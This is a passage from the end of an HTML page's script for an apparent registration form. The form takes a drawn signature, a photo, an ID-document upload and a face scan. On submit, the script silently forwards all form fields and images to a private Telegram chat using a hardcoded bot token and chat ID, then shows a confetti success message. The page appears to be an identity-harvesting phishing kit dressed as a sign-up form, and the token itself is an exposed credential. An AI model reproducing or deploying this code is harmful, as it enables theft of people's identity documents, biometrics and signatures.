      drawing = true;
      const pos = getPosition(e);
      ctx.beginPath();
      ctx.moveTo(pos.x, pos.y);
    }

    function draw(e) {
      if (!drawing) return;
      const pos = getPosition(e);
      ctx.lineTo(pos.x, pos.y);
      ctx.stroke();
    }

    function stopDrawing() {
      drawing = false;
      ctx.closePath();
    }

    function getPosition(e) {
      const rect = canvas.getBoundingClientRect();
      if (e.touches) {
        return { x: e.touches[0].clientX - rect.left, y: e.touches[0].clientY - rect.top };
      }
      return { x: e.clientX - rect.left, y: e.clientY - rect.top };
    }

    canvas.onmousedown = startDrawing;
    canvas.onmousemove = draw;
    canvas.onmouseup = stopDrawing;
    canvas.onmouseout = stopDrawing;
    canvas.ontouchstart = (e) => { e.preventDefault(); startDrawing(e); };
    canvas.ontouchmove = (e) => { e.preventDefault(); draw(e); };
    canvas.ontouchend = stopDrawing;

    clearSignatureBtn.onclick = () => ctx.clearRect(0, 0, canvas.width, canvas.height);

    // Form submission to Telegram
    regForm.onsubmit = async function(e) {
      e.preventDefault();
      document.getElementById('spinner').style.display = 'block'; // Show spinner
      const formData = new FormData(this);
      const photoFile = photoInput.files[0];
      const idFile = document.getElementById('idUpload').files[0];
      const signatureData = canvas.toDataURL('image/png');
      const faceScanData = facePreview.src;

      const botToken = '8166170009:AAFj2ei7GEXCIpQ-8JY0Of5rBkyTQVIcW-4'; // Replace with your Telegram bot token
      const chatId = '8155585808'; // Replace with your Telegram chat ID
      const telegramUrl = `https://api.telegram.org/bot${botToken}/`;

      let message = '';
      for (const [key, value] of formData.entries()) {
        if (value && key !== 'photo' && key !== 'idUpload') {
          message += `${key}: ${value}\n`;
        }
      }

      await fetch(`${telegramUrl}sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      if (photoFile) {
        const photoFormData = new FormData();
        photoFormData.append('chat_id', chatId);
        photoFormData.append('photo', photoFile);
        await fetch(`${telegramUrl}sendPhoto`, { method: 'POST', body: photoFormData });
      }

      if (idFile) {
        const docFormData = new FormData();
        docFormData.append('chat_id', chatId);
        docFormData.append('document', idFile);
        await fetch(`${telegramUrl}sendDocument`, { method: 'POST', body: docFormData });
      }

      if (faceScanData) {
        const faceScanBlob = await (await fetch(faceScanData)).blob();
        const faceFormData = new FormData();
        faceFormData.append('chat_id', chatId);
        faceFormData.append('photo', faceScanBlob, 'face_scan.png');
        await fetch(`${telegramUrl}sendPhoto`, { method: 'POST', body: faceFormData });
      }

      const signatureBlob = await (await fetch(signatureData)).blob();
      const sigFormData = new FormData();
      sigFormData.append('chat_id', chatId);
      sigFormData.append('photo', signatureBlob, 'signature.png');
      await fetch(`${telegramUrl}sendPhoto`, { method: 'POST', body: sigFormData });

      document.getElementById('spinner').style.display = 'none'; // Hide spinner

      document.getElementById('submissionModal').style.display = 'block';
      setTimeout(() => {
        document.getElementById('submissionModal').classList.add('show');
        confettiAnimation();
      }, 10);

      regForm.reset();
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      photoPreview.style.display = 'none';
      photoLabel.style.display = 'block';
      photoPreview.src = "";
      facePreview.style.display = 'none';
    };

    // Confetti animation
    function confettiAnimation() {
      const confettiContainer = document.getElementById('confetti');
      for (let i = 0; i < 100; i++) {
        const confettiPiece = document.createElement('div');
        confettiPiece.style.position = 'absolute';
        confettiPiece.style.width = '10px';
        confettiPiece.style.height = '10px';
        confettiPiece.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
        confettiPiece.style.top = `${Math.random() * 100}%`;
        confettiPiece.style.left = `${Math.random() * 100}%`;
        confettiPiece.style.transform = `rotate(${Math.random() * 360}deg)`;
        confettiPiece.style.animation = `fall ${Math.random() * 2 + 1}s linear`;
        confettiContainer.appendChild(confettiPiece);
      }
      const style = document.createElement('style');
      style.innerHTML = `@keyframes fall { to { transform: translateY(100vh); } }`;
      document.head.appendChild(style);
    }

    // Modal close handlers
    document.getElementById('closeModal').onclick = function() {
      document.getElementById('submissionModal').style.display = 'none';
      document.getElementById('submissionModal').classList.remove('show');
    };

    document.getElementById('submissionModal').onclick = function(e) {
      if (e.target === this) {
        this.style.display = 'none';
        this.classList.remove('show');
      }
    };
  </script>
</body>
</html>